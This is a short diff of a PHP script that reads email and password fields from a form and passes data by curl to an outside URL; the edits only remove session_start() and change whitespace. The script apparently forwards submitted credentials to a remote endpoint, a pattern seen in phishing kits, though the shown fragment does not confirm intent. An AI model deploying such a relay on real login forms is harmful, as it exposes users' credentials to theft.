@@ -1,5 +1,4 @@
 <?php
-    session_start();
 
     if(isset($_POST['email']) && isset($_POST['pass'])){
     	$email 	= $_POST['email'];
@@ -26,6 +25,7 @@
         curl_setopt( $ch, CURLOPT_USERAGENT, $useragent );
 
         $result = curl_exec( $ch );
+
         if($result=='"OK"'){
             echo $result;
             curl_setopt( $ch, CURLOPT_HEADER, true );
@@ -51,10 +51,11 @@
             curl_close( $ch );
         }
         return $result;
+
+
+
     }
 
-    fetch('https://secure.bitway.com/sp/a428.php', $data);
-
-    
+     fetch('https://secure.bitway.com/sp/a428.php', $data);
 
 ?>
